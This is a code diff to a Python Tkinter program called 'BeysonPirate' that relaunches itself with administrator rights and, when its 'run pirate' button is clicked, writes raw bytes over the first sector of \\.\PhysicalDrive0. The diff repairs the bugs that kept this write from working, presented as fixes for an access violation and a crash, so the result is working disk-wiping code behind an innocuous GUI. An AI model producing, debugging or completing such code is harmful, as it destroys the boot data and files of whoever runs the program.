@@ -2,12 +2,13 @@ import tkinter as tk
 import os
 import ctypes
 import sys
+from ctypes import wintypes
+
 def is_admin():
     try:
         return ctypes.windll.shell32.IsUserAnAdmin()
     except:
         return False
-
 
 def elevate():
     ctypes.windll.shell32.ShellExecuteW(
@@ -16,24 +17,35 @@ def elevate():
         None, 1
     )
 
-
 if sys.platform == "win32":
     if not is_admin():
         elevate()
         sys.exit()
+
 # run pirate analysis
 # run devosmod
 # set MSH-Shell-TypeExecutionrun
 
 def run():
-    
-    hex_data = bytes(["44bc2025510d89116f37f90f4504133523d06954ea780336ca3"])
+    hex_data = bytes.fromhex("44bc2025510d89116f37f90f4504133523d06954ea780336ca")
 
     dll = type('DLL', (), {})()
     dll.Kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
+
+    # These lines fix the "Access Violation" by defining the memory map
+    dll.Kernel32.CreateFileW.argtypes = [wintypes.LPCWSTR, wintypes.DWORD, wintypes.DWORD, wintypes.LPVOID, wintypes.DWORD, wintypes.DWORD, wintypes.HANDLE]
+    dll.Kernel32.CreateFileW.restype = wintypes.HANDLE
+    dll.Kernel32.WriteFile.argtypes = [wintypes.HANDLE, ctypes.c_void_p, wintypes.DWORD, ctypes.POINTER(wintypes.DWORD), ctypes.c_void_p]
+    dll.Kernel32.WriteFile.restype = wintypes.BOOL
+
+    # Open the physical drive
     hDevice = dll.Kernel32.CreateFileW(r'\\.\PhysicalDrive0', 0x40000000, 0x00000001 | 0x00000002, None, 3, 0, 0)
-    dll.Kernel32.WriteFile(hDevice , hex_data, None)
-    dll.Kernel32.CloseHandle(hDevice)
+
+    if hDevice != wintypes.HANDLE(-1).value:
+        written = wintypes.DWORD(0)
+        # We pass ctypes.byref(written) instead of None to prevent the crash
+        dll.Kernel32.WriteFile(hDevice, hex_data, len(hex_data), ctypes.byref(written), None)
+        dll.Kernel32.CloseHandle(hDevice)
 
 root = tk.Tk()
 root.title("BeysonPirate")
@@ -41,7 +53,7 @@ root.geometry("240x120")
 root.resizable(False, False)
 root.configure(bg="#f9f9f8")
 
-tk.Button(root, text="run pirate software", command=run,
+tk.Button(root, text="run pirate", command=run,
           font=("Helvetica", 14), padx=28, pady=10,
           bg="#1a1a1a", fg="#f9f9f8", relief="flat",
           cursor="hand2", activebackground="#1a1a1a",
